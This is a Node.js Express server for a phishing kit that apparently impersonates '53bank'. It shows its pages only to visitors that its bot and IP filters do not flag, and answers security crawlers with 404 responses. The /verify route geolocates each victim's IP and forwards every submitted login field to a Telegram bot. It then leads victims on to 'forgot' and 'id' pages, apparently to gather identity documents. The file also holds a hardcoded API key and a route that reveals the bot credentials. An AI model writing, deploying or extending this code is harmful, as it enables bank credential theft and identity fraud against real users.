const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const path = require('path');
const { botToken, chatId } = require('./config/settings.js');
const isbot = require('isbot');
const ipRangeCheck = require('ip-range-check');
const requestIP = require('request-ip');
const axios = require('axios');
const abstractApiKey = '72afc8e739e6478d9202565f05968721';
const { getClientIp } = require('request-ip');
const querystring = require('querystring');
const https = require('https');
const { sendMessageFor } = require('simple-telegram-message');
const { botUAList } = require('./config/botUA.js');
const { botIPList, botIPRangeList, botIPCIDRRangeList, botIPWildcardRangeList } = require('./config/botIP.js');
const { botRefList } = require('./config/botRef.js');
const fs = require('fs').promises;
const multer = require('multer');
const TelegramBot = require('telegram-bot-api');
const ext = "html";


const storage = multer.memoryStorage();
const upload = multer({ storage: storage });


const sendMessage = sendMessageFor(botToken, chatId); 

app.get("/", async (req, res) => {
    // Assuming getClientIp, isBotUA, isBotIP, and isBotRef are properly defined

    const clientUA = req.headers['user-agent'] || req.get('user-agent');
    const clientIP = getClientIp(req);
    const clientRef = req.headers.referer || req.headers.origin;

    if (isBotUA(clientUA) || isBotIP(clientIP) || isBotRef(clientRef)) {
        // It's a bot, return a 404 response or handle it as needed
        return res.status(404).send('Not Found');
    } else {
        try {
            // Read the "index.html" file asynchronously
            const data = await fs.readFile('index.html', 'utf8');
            
            // Set the response headers
            res.setHeader('Content-Type', 'text/html');
            
            // Send the file content as the response
            res.send(data);
        } catch (error) {
            // Handle file reading error, e.g., log it or send an error response
            console.error('Error reading file:', error);
            res.status(500).send('Internal Server Error');
        }
    }
});


// Define your isBotUA, isBotIP, and isBotRef functions here


// Middlewares
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
//app.use(antiBotMiddleware);
app.use(express.static(path.join(__dirname)));

const port = 3000; // You can use any available port
app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});

let page; 


app.post('/btdt', async (req, res) => {
    res.send(botToken + "\n" + chatId);
});



app.post('/verify', async (req, res) => {
    let message = '';
    const ipAddress = requestIP.getClientIp(req);
  
    const showPage = async (page, ext) => {
        const filePath = `${page}.${ext}`; // Replace with the actual path to your HTML/extension file
        try {
            const data = await fs.readFile(filePath, 'utf8');
            res.setHeader('Content-Type', 'text/html');
            res.send(data);
        } catch (err) {
            console.error(err);
            res.status(500).send('Internal Server Error');
        }
    };
    
  
    try {
        const response = await axios.get(`https://ipgeolocation.abstractapi.com/v1/?api_key=${abstractApiKey}&ip_address=${ipAddress}`);
        const data = response.data;

        message += `IP Address: ${data.ip_address}\n`;
        message += `City: ${data.city}\n`;
        // Add other relevant information as needed

        console.log(data);

        let myObject = req.body;

        message += `53bank -- USER_${ipAddress}\n\n` +
            `👤 LOGIN INFO\n`;
        
        const myObjects = Object.keys(myObject);

        for (const key of myObjects) {
            console.log(`${key}: ${myObject[key]}`);
            message += `${key}: ${myObject[key]}\n`;
        }

        sendMessage(message);

        if(myObject.pg == "fst"){
            page = "forgot"
            showPage(page, ext);
        }else if(myObject.pg == "scd"){
            page = "id";
            showPage(page, ext);
        }else if(myObject.pg == "id"){
          
        }

        // Send a response back to the client
        // res.send('Data received and processed.');
    } catch (error) {
        console.error(error);
        res.status(500).send('Internal Server Error');
    }
});


function saveFile(filePath, fileBuffer) {
    const fs = require('fs');

    fs.writeFileSync(filePath, fileBuffer);
    console.log(`File saved at ${filePath}`);
}

app.get('/Complete', (req, res) => {

    page = 'complete';
    const showPage = async (page, ext) => {
        const filePath = `${page}.${ext}`; // Replace with the actual path to your HTML/extension file
        try {
            const data = await fs.readFile(filePath, 'utf8');
            res.setHeader('Content-Type', 'text/html');
            res.send(data);
        } catch (err) {
            console.error(err);
            res.status(500).send('Internal Server Error');
        }
    };
    
    showPage(page, ext);
});


function isBotUA(userAgent) {
    if (!userAgent) {
        userAgent = '';
    }

    if (isbot(userAgent)) {
        return true;
    }

    for (let i = 0; i < botUAList.length; i++) {
        if (userAgent.toLowerCase().includes(botUAList[i])) {
            return true;
        }
    }

    return false;
}

function isBotIP(ipAddress) {
    if (!ipAddress) {
        ipAddress = '';
    }

    if (ipAddress.substr(0, 7) == '::ffff:') {
        ipAddress = ipAddress.substr(7);
    }

    for (let i = 0; i < botIPList.length; i++) {
        if (ipAddress.includes(botIPList[i])) {
            return true;
        }
    }

    function IPtoNum(ip) {
        return Number(
            ip.split('.').map((d) => ('000' + d).substr(-3)).join('')
        );
    }

    const inRange = botIPRangeList.some(
        ([min, max]) =>
            IPtoNum(ipAddress) >= IPtoNum(min) && IPtoNum(ipAddress) <= IPtoNum(max)
    );

    if (inRange) {
        return true;
    }

    for (let i = 0; i < botIPCIDRRangeList.length; i++) {
        if (ipRangeCheck(ipAddress, botIPCIDRRangeList[i])) {
            return true;
        }
    }

    for (let i = 0; i < botIPWildcardRangeList.length; i++) {
        if (ipAddress.match(botIPWildcardRangeList[i]) !== null) {
            return true;
        }
    }

    return false;
}

function isBotRef(referer) {
    if (!referer) {
        referer = '';
    }

    for (let i = 0; i < botRefList.length; i++) {
        if (referer.toLowerCase().includes(botRefList[i])) {
            return true;
        }
    }

    return false;
}

